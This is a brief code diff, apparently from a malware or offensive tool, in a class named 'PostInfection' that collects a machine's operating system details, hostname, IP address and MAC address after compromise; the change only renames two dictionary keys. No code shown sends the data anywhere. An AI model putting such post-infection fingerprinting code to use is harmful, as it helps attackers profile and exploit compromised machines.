@@ -98,10 +98,10 @@ class PostInfection(object):
         import platform,socket,json,re,uuid,psutil
         try:
             info={}
-            info['platform']=platform.system()
+            info['platform-name']=platform.system()
             info['platform-release']=platform.release()
             info['platform-version']=platform.version()
-            info['architecture']=platform.machine()
+            info['platform-architecture']=platform.machine()
             info['hostname']=socket.gethostname()
             info['ip-address']=socket.gethostbyname(socket.gethostname())
             info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
